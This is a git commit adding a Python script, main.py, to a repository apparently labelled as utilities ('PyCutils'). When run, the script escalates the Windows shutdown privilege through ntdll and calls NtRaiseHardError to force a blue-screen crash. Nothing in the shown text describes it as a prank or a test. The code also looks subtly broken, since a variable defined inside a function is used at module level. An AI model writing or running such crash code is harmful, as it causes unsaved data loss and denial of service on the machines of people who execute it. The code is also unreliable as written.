9f3eff297c3614c36346d18932d9dad3dbe967dd
loudtrexx <pelisahko99@gmail.com>
2025-05-03 15:19:11 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,32 @@
+# PyCutils https://github.com/loudtrexx
+
+import ctypes
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
+
+def BSOD_cause(code):
+    hex(code)
+    nullptr = POINTER(c_int)()
+
+windll.ntdll.RtlAdjustPrivilege(
+    c_uint(19),
+    c_uint(1),
+    c_uint(0),
+    byref(c_int())
+)
+
+windll.ntdll.NtRaiseHardError(
+    c_ulong(0xC000007B),
+    c_ulong(0),
+    nullptr,
+    nullptr,
+    c_uint(6),
+    byref(c_uint())
+)
+
+
+BSOD_cause("ses")
